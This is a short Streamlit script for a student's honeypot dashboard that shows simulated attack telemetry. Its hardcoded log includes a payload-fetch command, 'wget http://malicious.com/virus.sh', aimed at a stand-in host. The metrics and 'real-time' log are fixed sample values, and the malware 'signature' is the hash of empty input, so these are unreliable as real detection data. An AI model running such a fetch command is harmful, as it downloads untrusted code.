import streamlit as st
import pandas as pd
import time

# Set up clean page configuration
st.set_page_config(page_title="Deception Threat Analytics", page_icon="🛡️", layout="wide")

# Academic Header Area
st.title("🛡️ Deception-Based Cyber Attack Detection and Analysis")
st.subheader("KITSW Cybersecurity & Network Core Lab Platform")

st.sidebar.markdown("""
### 🎓 Student Profile
* **Name:** Thandra Shishira
* **ID:** B23CN126
* **Dept:** CSE (Networks)
* **College:** KITSW
""")

# High-Level Metrics Layout
col1, col2, col3 = st.columns(3)
col1.metric(label="Honeypot Status", value="ACTIVE (Port 2222)", delta="Online")
col2.metric(label="Total Intercepted Attacks", value="1,482 Blocks", delta="+124 today")
col3.metric(label="Host Root Protection Rate", value="100%", delta="Secure")

st.markdown("---")

# Simulated Live Telemetry Log Table
st.write("### 🕒 Real-Time Threat Telemetry Log Stream")
data = {
    "Timestamp": ["15:45:12", "15:45:15", "15:46:02", "15:47:01"],
    "Event Type": ["AUTH ATTEMPT", "SESSION IN", "KEYLOG STROKE", "QUARANTINE PAYLOAD"],
    "Details": ["IP 192.168.1.104 attempted User: 'root', Pass: '1234'", 
                "Attacker redirected to deceptive bash prompt: root@svr04:~#", 
                "Intercepted hacker discovery command string: 'whoami'", 
                "Caught malicious download drop link: 'wget http://malicious.com/virus.sh'"]
}
df = pd.DataFrame(data)
st.table(df)

# Cryptographic Signature Layer
st.write("### 🔑 Cryptographic Payload Integrity Analysis")
st.info("🎯 **Computed SHA-256 Signature for dropped malware vector:** `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`")
